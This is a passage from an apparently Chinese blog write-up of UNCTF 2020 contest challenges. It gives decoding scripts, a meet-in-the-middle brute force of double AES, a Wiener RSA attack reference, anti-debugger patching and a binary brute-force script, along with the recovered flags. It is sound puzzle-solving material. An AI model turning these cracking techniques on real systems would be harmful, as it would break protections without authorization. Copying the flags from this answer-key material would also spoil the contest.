class="number">1</span></span><br><span class="line">    x, y = size // <span class="number">2</span>, size // <span class="number">2</span></span><br><span class="line">    arr[y][x] = max  <span class="comment"># 中心点</span></span><br><span class="line">    x -= <span class="number">1</span>  <span class="comment"># 向左移动一步</span></span><br><span class="line">    <span class="comment"># arr[y][x] = arr[size - 1 - y][size - 1 - x] = 2</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">        arr[y][x] = max - <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> f == <span class="number">0</span>:</span><br><span class="line">        arr[size - <span class="number">1</span> - y][size - <span class="number">1</span> - x] = max - <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        arr[y][x] = arr[size - <span class="number">1</span> - y][size - <span class="number">1</span> - x] = max - <span class="number">1</span></span><br><span class="line">    num, step = max - <span class="number">1</span>, <span class="number">1</span>  <span class="comment"># 表示每次存取的数字</span></span><br><span class="line">    <span class="keyword">while</span> num &gt; min:  <span class="comment"># 双螺旋矩阵赋值动作同时进行,step不是表示程序赋值的次数，而是表示程序赋值的方向，</span></span><br><span class="line">        <span class="keyword">if</span> step % <span class="number">2</span> == <span class="number">1</span>:  <span class="comment"># 奇数步  右上，左下</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(step * <span class="number">2</span> - <span class="number">1</span>):</span><br><span class="line">                num -= <span class="number">1</span></span><br><span class="line">                y += <span class="number">1</span>  <span class="comment"># 每次只是x增加1，</span></span><br><span class="line">                <span class="comment"># arr[y][x] = arr[size - 1 - y][size - 1 - x] = num  # 向右，对称赋值</span></span><br><span class="line">                <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">                    arr[y][x] = num</span><br><span class="line">                <span class="keyword">elif</span> f == <span class="number">0</span>:</span><br><span class="line">                    arr[size - <span class="number">1</span> - y][size - <span class="number">1</span> - x] = num</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    arr[y][x] = arr[size - <span class="number">1</span> - y][size - <span class="number">1</span> - x] = num</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(step * <span class="number">2</span> + <span class="number">1</span>):  <span class="comment"># i表示次数，之所以每次会出现i每次相隔为2，向右的步数加上2等于向下的步数，</span></span><br><span class="line">                num -= <span class="number">1</span></span><br><span class="line">                x += <span class="number">1</span>  <span class="comment"># 每次增加y，增加i次</span></span><br><span class="line">                <span class="comment"># arr[y][x] = arr[size - 1 - y][size - 1 - x] = num  # 向下</span></span><br><span class="line">                <span class="comment"># arr[y][x] = num</span></span><br><span class="line">                <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">                    arr[y][x] = num</span><br><span class="line">                <span class="keyword">elif</span> f == <span class="number">0</span>:</span><br><span class="line">                    arr[size - <span class="number">1</span> - y][size - <span class="number">1</span> - x] = num</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    arr[y][x] = arr[size - <span class="number">1</span> - y][size - <span class="number">1</span> - x] = num</span><br><span class="line">                <span class="keyword">if</span> (num == min):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            step += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 偶数步。向左的步数加上2等于向上的步数，左上，右下</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(step * <span class="number">2</span> - <span class="number">1</span>):</span><br><span class="line">                num -= <span class="number">1</span></span><br><span class="line">                y -= <span class="number">1</span></span><br><span class="line">                <span class="comment"># arr[y][x] = arr[size - 1 - y][size - 1 - x] = num  # 向右</span></span><br><span class="line">                <span class="comment"># arr[size - 1 - y][size - 1 - x] = num</span></span><br><span class="line">                <span class="comment"># arr[y][x] = num</span></span><br><span class="line">                <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">                    arr[y][x] = num</span><br><span class="line">                <span class="keyword">elif</span> f == <span class="number">0</span>:</span><br><span class="line">                    arr[size - <span class="number">1</span> - y][size - <span class="number">1</span> - x] = num</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    arr[y][x] = arr[size - <span class="number">1</span> - y][size - <span class="number">1</span> - x] = num</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(step * <span class="number">2</span> + <span class="number">1</span>):</span><br><span class="line">                num -= <span class="number">1</span></span><br><span class="line">                x -= <span class="number">1</span></span><br><span class="line">                <span class="comment"># arr[y][x] = arr[size - 1 - y][size - 1 - x] = num  # 向上，对称赋值</span></span><br><span class="line">                <span class="comment"># arr[y][x] = num</span></span><br><span class="line">                <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">                    arr[y][x] = num</span><br><span class="line">                <span class="keyword">elif</span> f == <span class="number">0</span>:</span><br><span class="line">                    arr[size - <span class="number">1</span> - y][size - <span class="number">1</span> - x] = num</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    arr[y][x] = arr[size - <span class="number">1</span> - y][size - <span class="number">1</span> - x] = num</span><br><span class="line">                <span class="keyword">if</span> (num == min):  <span class="comment"># 最后跳出循环</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            step += <span class="number">1</span>  <span class="comment"># 步子一直增加</span></span><br><span class="line">    <span class="comment"># for matrix in arr:</span></span><br><span class="line">        <span class="comment"># print("\t".join(map(lambda x: str(x), matrix)))</span></span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pairterSpiralMatrix1(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line"><span class="comment"># pairterSpiralMatrix1(5,3)</span></span><br><span class="line"><span class="comment"># pairterSpiralMatrix1(5)</span></span><br><span class="line"><span class="comment"># pairterSpiralMatrix1(5,1)</span></span><br><span class="line"><span class="comment"># print('\n')</span></span><br><span class="line"><span class="comment"># pairterSpiralMatrix1(5,0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t = pairterSpiralMatrix1(3)</span></span><br><span class="line"><span class="comment"># print(t)</span></span><br><span class="line">arr = pairterSpiralMatrix1(<span class="number">57</span>, <span class="number">1</span>)<span class="comment">#左上</span></span><br><span class="line"><span class="comment"># print arr</span></span><br><span class="line">arr1 = pairterSpiralMatrix1(<span class="number">57</span>, <span class="number">0</span>)<span class="comment">#右下</span></span><br><span class="line">f = open(<span class="string">'out.txt'</span>, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">bg = f.readlines()</span><br><span class="line"><span class="comment"># bg = bg[2].strip().split(' ')</span></span><br><span class="line">l = len(bg[<span class="number">2</span>].strip().split(<span class="string">' '</span>))</span><br><span class="line"><span class="comment"># print(bg)</span></span><br><span class="line"><span class="comment"># print l</span></span><br><span class="line">ls = &#123;&#125;<span class="comment">#左上</span></span><br><span class="line">ls1 = &#123;&#125;<span class="comment">#右下</span></span><br><span class="line"><span class="comment"># print arr[0][0]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(l):</span><br><span class="line">        <span class="comment"># print arr[i][j]</span></span><br><span class="line">        <span class="keyword">if</span> arr[i][j] != <span class="number">0</span>:</span><br><span class="line">            ls[arr[i][j]] = bg[i].strip().split(<span class="string">' '</span>)[j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(l):</span><br><span class="line">        <span class="comment"># print arr[i][j]</span></span><br><span class="line">        <span class="keyword">if</span> arr1[i][j] != <span class="number">0</span>:</span><br><span class="line">            ls1[arr1[i][j]] = bg[i].strip().split(<span class="string">' '</span>)[j]</span><br><span class="line"><span class="comment">#print(ls1)</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(ls) + <span class="number">1</span>):</span><br><span class="line">    res += ls[i] + <span class="string">' '</span></span><br><span class="line"><span class="comment">#print(res.split(' ')[57])</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res.split(<span class="string">' '</span>):</span><br><span class="line">    flag += i + <span class="string">' '</span></span><br><span class="line"><span class="comment">#print(flag.split(' '))</span></span><br><span class="line"></span><br><span class="line">res1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(ls) + <span class="number">1</span>):</span><br><span class="line">    res1 += ls1[i] + <span class="string">' '</span></span><br><span class="line"><span class="comment">#print(res1.split(' ')[57])</span></span><br><span class="line">flag1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1.split(<span class="string">' '</span>):</span><br><span class="line">    flag1 += i + <span class="string">' '</span></span><br><span class="line"><span class="comment">#print(flag1)</span></span><br><span class="line"><span class="comment">#print(set(flag) &amp; set(flag1))</span></span><br><span class="line">rrr = []</span><br><span class="line">rrrr = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag.split(<span class="string">' '</span>):</span><br><span class="line">    <span class="comment"># rrr.append(i.replace('☰','000').replace('☱','001').replace('☲','010').replace('☳','110').replace('☴','100').replace('☵','101').replace('☶','110').replace('☷','111'))</span></span><br><span class="line">    rrr.append(i.replace(<span class="string">'☰'</span>,<span class="string">'111'</span>).replace(<span class="string">'☶'</span>,<span class="string">'100'</span>).replace(<span class="string">'☷'</span>,<span class="string">'000'</span>).replace(<span class="string">'☴'</span>,<span class="string">'110'</span>).replace(<span class="string">'☱'</span>,<span class="string">'011'</span>).replace(<span class="string">'☲'</span>,<span class="string">'101'</span>).replace(<span class="string">'☵'</span>,<span class="string">'010'</span>).replace(<span class="string">'☳'</span>,<span class="string">'001'</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag1.split(<span class="string">' '</span>):</span><br><span class="line">    <span class="comment"># rrrr.append(i.replace('☰','000').replace('☱','001').replace('☲','010').replace('☳','110').replace('☴','100').replace('☵','101').replace('☶','110').replace('☷','111'))</span></span><br><span class="line">    rrrr.append(i.replace(<span class="string">'☰'</span>,<span class="string">'111'</span>).replace(<span class="string">'☶'</span>,<span class="string">'100'</span>).replace(<span class="string">'☷'</span>,<span class="string">'000'</span>).replace(<span class="string">'☴'</span>,<span class="string">'110'</span>).replace(<span class="string">'☱'</span>,<span class="string">'011'</span>).replace(<span class="string">'☲'</span>,<span class="string">'101'</span>).replace(<span class="string">'☵'</span>,<span class="string">'010'</span>).replace(<span class="string">'☳'</span>,<span class="string">'001'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(rrr[:-3])</span></span><br><span class="line"><span class="comment">#print(rrrr[:-3])</span></span><br><span class="line">base64_list = [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>,<span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>,<span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>,<span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'+'</span>, <span class="string">'/'</span>]</span><br><span class="line"></span><br><span class="line">rrr1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rrr[:<span class="number">-3</span>]:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">'=='</span>:</span><br><span class="line">        rrr1.append(base64_list[int(i,<span class="number">2</span>)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rrr1.append(i)</span><br><span class="line"><span class="comment">#print(rrr1)</span></span><br><span class="line"></span><br><span class="line">rrr2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rrr1:</span><br><span class="line">    rrr2 += i</span><br><span class="line"></span><br><span class="line">print(rrr2)</span><br><span class="line"></span><br><span class="line">rrrr1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rrrr[:<span class="number">-3</span>]:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">'=='</span>:</span><br><span class="line">        rrrr1.append(base64_list[int(i,<span class="number">2</span>)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rrrr1.append(i)</span><br><span class="line"><span class="comment">#print(rrrr1)</span></span><br><span class="line"></span><br><span class="line">rrrr2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rrrr1:</span><br><span class="line">    rrrr2 += i</span><br><span class="line"></span><br><span class="line">print(rrrr2)</span><br></pre></td></tr></table></figure>

<p>生成矩阵的部分代码是复制过来改的，所以有些注释可能不对，大概能看懂就行</p>
<p>上面的代码最后结果是两段base64，也是去base64.us上面解码为hex，再填入winhex，得到两张bmp，最后对两张图片做一下异或，或者更简单直接去linux上compare一下，得到flag</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc16-2.bmp" alt="misc16-2"></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="0x1-鞍山大法官开庭之缺的营养这一块怎么补"><a href="#0x1-鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="0x1 鞍山大法官开庭之缺的营养这一块怎么补"></a>0x1 鞍山大法官开庭之缺的营养这一块怎么补</h3><p>培根密码，把ot替换为ab解码就行了</p>
<h3 id="0x2-wing"><a href="#0x2-wing" class="headerlink" title="0x2 wing"></a>0x2 wing</h3><p>查了下资料发现是word里的wingdings 2符号，对照图片找到每个字符的字符代码再chr一下就好了</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/crypto2-1.png" alt="crypto2-1"></p>
<h3 id="0x3-easy-rsa"><a href="#0x3-easy-rsa" class="headerlink" title="0x3 easy_rsa"></a>0x3 easy_rsa</h3><p>最基础的rsa，pqe都知道了，直接上脚本求个d就能解</p>
<h3 id="0x4-简单的RSA"><a href="#0x4-简单的RSA" class="headerlink" title="0x4 简单的RSA"></a>0x4 简单的RSA</h3><p>e非常大，pq也不知道，典型维纳攻击，上脚本一把梭</p>
<p>顺便给个脚本地址<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></p>
<h3 id="0x5-signin"><a href="#0x5-signin" class="headerlink" title="0x5 signin"></a>0x5 signin</h3><p>用aes加密了两次，给了一个明文和密码，可以折中爆破两个密钥，即明文加密，密文解密，两者一样就可以得到两个密钥，这样爆破次数就只有100*100*100*2，下面附上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_16</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(text.encode(<span class="string">'utf-8'</span>)) % <span class="number">16</span>:</span><br><span class="line">        add = <span class="number">16</span> - (len(text.encode(<span class="string">'utf-8'</span>)) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        add = <span class="number">0</span></span><br><span class="line">    text = text + (<span class="string">'\0'</span> * add)</span><br><span class="line">    <span class="keyword">return</span> text.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    key = key.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    cryptor = AES.new(key, mode)</span><br><span class="line">    plain_text = cryptor.decrypt(a2b_hex(text))</span><br><span class="line">    <span class="keyword">return</span> hexlify(plain_text)</span><br><span class="line">    <span class="keyword">return</span> bytes.decode(plain_text).rstrip(<span class="string">'\0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    key = key.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    mode = AES.MODE_ECB</span><br><span class="line">    text = add_to_16(text)</span><br><span class="line">    cryptos = AES.new(key, mode)</span><br><span class="line">    cipher_text = cryptos.encrypt(text)</span><br><span class="line">    <span class="keyword">return</span> b2a_hex(cipher_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list1 = &#123;&#125;</span><br><span class="line">pt = <span class="string">'UNCTF2020_Enjoy_Crypto~'</span></span><br><span class="line">cipher = <span class="string">'01a4e429e76db218fa0eb18f03ec69c9200a2362d8b4d7ea46170ce698389bbd'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">            key1 = <span class="string">'0000000000000'</span> + i + j + k</span><br><span class="line">            list1[i + j + k] = encrypt(pt, key1)</span><br><span class="line">            <span class="comment"># key2 = 'abc0000000000000'</span></span><br><span class="line">            <span class="comment"># cipher1 = AES.new(key=key1.encode(), mode=AES.MODE_ECB)</span></span><br><span class="line">            <span class="comment"># cipher2 = AES.new(key=key2.encode(), mode=AES.MODE_ECB)</span></span><br><span class="line">            <span class="comment"># val = len(pt) % 16</span></span><br><span class="line">            <span class="comment"># if not val == 0:</span></span><br><span class="line">            <span class="comment">#     pt += b'\x00' * (16 - val)</span></span><br><span class="line">            <span class="comment"># c1 = cipher1.encrypt(pt)</span></span><br><span class="line">            <span class="comment"># list1[i + j + k] = hexlify(cipher2.encrypt(c1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(list1)</span></span><br><span class="line">list2 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">            key2 = i + j + k + <span class="string">'0000000000000'</span></span><br><span class="line">            list2[i + j + k] = decrypt(cipher, key2)</span><br><span class="line"><span class="comment"># print(list2)</span></span><br><span class="line"></span><br><span class="line">L1 = []</span><br><span class="line">L2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1.values():</span><br><span class="line">    L1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list2.values():</span><br><span class="line">    L2.append(i)</span><br><span class="line"></span><br><span class="line">same = set(L1) &amp; set(L2)</span><br><span class="line">same = list(same)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">'key1:0000000000000'</span>+list(list1.keys())[list(list1.values()).index(same)])</span><br><span class="line">print(<span class="string">'key2:'</span>+list(list2.keys())[list(list2.values()).index(same)]+<span class="string">'0000000000000'</span>)</span><br><span class="line"></span><br><span class="line">key1=<span class="string">'0000000000000'</span> + list(list1.keys())[list(list1.values()).index(same)]</span><br><span class="line">key2= list(list2.keys())[list(list2.values()).index(same)]+<span class="string">'0000000000000'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def get_key(dict, value):</span></span><br><span class="line"><span class="comment">#     return [k for k, v in dict.items() if v == value]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print(get_key(L1,same))</span></span><br><span class="line"><span class="comment"># key1 = '0000000000000W&lt;&amp;'</span></span><br><span class="line"><span class="comment"># key2 = '0/i0000000000000'</span></span><br><span class="line">c4 = <span class="string">b'196cc94c2d685beb54beeaa14c1dc0a6f3794d65fca0d1a1274515166e4255ab367383092e42d774992f74bc138faaad'</span></span><br><span class="line">c3 = decrypt(c4,key2)</span><br><span class="line">flaghex = decrypt(c3,key1)</span><br><span class="line">print(flaghex)</span><br><span class="line">print(a2b_hex(flaghex))</span><br></pre></td></tr></table></figure>

<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h3 id="0x1-easyMaze"><a href="#0x1-easyMaze" class="headerlink" title="0x1 easyMaze"></a>0x1 easyMaze</h3><p>常规迷宫题，拖进ida发现是wasd走路，有调试器检测，NOP掉后调试一下发现迷宫大概长这样，手动走一下就好了</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/Re1-1.png" alt="Re1-1"></p>
<h3 id="0x2-ICU"><a href="#0x2-ICU" class="headerlink" title="0x2 ICU"></a>0x2 ICU</h3><p>没有看逻辑，发现加密是有规律的，每三位生成四位，并且比如a和aa加密后开头都是一样的，就是说只要是一个字符开头后面再加其他字符加密后的前面的字符也是一样的，依据这个可以写程序爆破即可，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters <span class="keyword">as</span> lt</span><br><span class="line"></span><br><span class="line">s = <span class="string">'HSWEH2vXHmRtGZRJvSmKviwtviv4Ga5rD25Mvl:u6ewBUKg9'</span></span><br><span class="line">print(len(s))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">process = subprocess.Popen([<span class="string">'ICU.exe'</span>],stdout = subprocess.PIPE,</span><br><span class="line">          stdin = subprocess.PIPE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># out = process.communicate('A'.encode())</span></span><br><span class="line"><span class="comment"># out = str(list(out)[0])</span></span><br><span class="line"><span class="comment"># out = out.split('\\n')[4].replace('\\r','')</span></span><br><span class="line"><span class="comment">#res = 'unctf&#123;we_remember_everything_YLBN'</span></span><br><span class="line">res = <span class="string">'unctf&#123;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, len(s)//<span class="number">4</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> lt+<span class="string">'+_&#125;!'</span>:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> lt+<span class="string">'+_&#125;!'</span>:</span><br><span class="line">            f1 = <span class="literal">False</span></span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> lt+<span class="string">'+_&#125;!'</span>:</span><br><span class="line">                f2 = <span class="literal">False</span></span><br><span class="line">                process = subprocess.Popen([<span class="string">'ICU.exe'</span>], stdout=subprocess.PIPE,stdin=subprocess.PIPE)</span><br><span class="line">                part = a + b + c</span><br><span class="line">                out = process.communicate((res + part).encode())</span><br><span class="line">                print(res + part)</span><br><span class="line">                out = str(list(out)[<span class="number">0</span>])</span><br><span class="line">                out = out.split(<span class="string">'\\n'</span>)[<span class="number">4</span>].replace(<span class="string">'\\r'</span>, <span class="string">''</span>)</span><br><span class="line">                print(out)</span><br><span class="line">                print(s[<span class="number">0</span>:<span class="number">4</span>*(i+<span class="number">1</span>)])</span><br><span class="line">                <span class="comment"># print(out[i])</span></span><br><span class="line">                <span class="comment"># print(s[i])</span></span><br><span class="line">                <span class="keyword">if</span> out[<span class="number">4</span>*i]!=s[<span class="number">4</span>*i]:</span><br><span class="line">                    f1 = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f1 = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> out[<span class="number">4</span> * i+<span class="number">1</span>] != s[<span class="number">4</span> * i+<span class="number">1</span>]:</span><br><span class="line">                    f2 = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f2 = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> out==s[<span class="number">0</span>:<span class="number">4</span>*(i+<span class="number">1</span>)]:</span><br><span class="line">                    res += part</span><br><span class="line">                    print(out)</span><br><span class="line">                    print(s[<span class="number">0</span>:<span class="number">4</span> * (i + <span class="number">1</span>)])</span><br><span class="line">                    print(part)</span><br><span class="line">                    f = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> f2==<span class="literal">False</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> f1==<span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> f == <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> f == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">'false:'</span>+part)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>爆破要点时间，可以边爆边猜，因为都是有意义的单词，最后flag是：unctf{we_remember_everything_YLBNB!}</p>
<h3 id="0x3-ezRust"><a href="#0x3-ezRust" class="headerlink" title="0x3 ezRust"></a>0x3 ezRust</h3><p>该程序需要两个参数才能运行，先搜索字符串，根据success字眼来到主代码段，顺便看到了两串奇怪的字符串“YLBNB” 和 “RUSTPROGRAMING”，来到success和fail判断分支后，进行逐步溯源，最后发现要输入的两个参数就是这两个字符串，抱着试一试的心态，最后发现还真是。</p>
<h3 id="0x4-re-checkin"><a href="#0x4-re-checkin" class="headerlink" title="0x4 re_checkin"></a>0x4 re_checkin</h3><p>64位，搜索字符串，定位到input处，然后发现str1和str2进行了比对操作，跟进str2，发现：</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DFnK2j.png" alt></p>
<p>然后点击byte_42F041，按x进行搜索交叉引用：</p>
<p><img src="https://s3.ax1x.com/2020/11/15/DFnNiF.png" alt></p>
<p>看到了flag</p>
<h3 id="0x5-反编译："><a href="#0x5-反编译：" class="headerlink" title="0x5 反编译："></a>0x5 反编译：</h3><p>用pyinstxtractor.py 文件对exe进行反编译操作，生成一个文件夹，文件夹下有个“run”文件，发现缺少了文件头，补上pyc的文件头：</p>
<blockquote>
<p> 33 0D 0D 0A 00 00 00 00 00 00 00 00</p>
</blockquote>
<p>然后改扩展名为run.pyc ，最后放到在线py反编译网站上进行反编译得到如下代码程序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str2 = <span class="string">'UMAQBvogWLDTWgX"""k'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line"></span><br><span class="line">  flag += chr(ord(str2[i]) + i)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>把以上代码运行一遍就得到flag了</p>
<h3 id="0x6-babypy："><a href="#0x6-babypy：" class="headerlink" title="0x6 babypy："></a>0x6 babypy：</h3><p>本题和“反编译”解题流程类似，也是用经典python反编译文件pyinstxtractor.py对exe文件进行反编译得到一个文件夹，补上缺少的pyc文件头，然后改扩展名为babypy.pyc，放到在线python反编译网站，发现只能反编译一分：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'unctf&#123;*******************&#125;'</span></span><br></pre></td></tr></table></figure>

<p>一开始很灰心，不过后来发现导入了libnum和binascii，又根据题目给出的tip.txt，我写出了如下脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">b=<span class="string">'111010101101110011000110111010001100110011110110101010001101000010000000111010001011111011010010111001101011111011100100110010101100001001100010011000101111001010111110110001100110000001100000011000101111101'</span></span><br><span class="line">print(libnum.b2s(b))</span><br></pre></td></tr></table></figure>

<p>一不小心猜对了，得到flag</p>
<h3 id="0x7-ezvm"><a href="#0x7-ezvm" class="headerlink" title="0x7 ezvm"></a>0x7 ezvm</h3><p>这一题带有“试”的成分。</p>
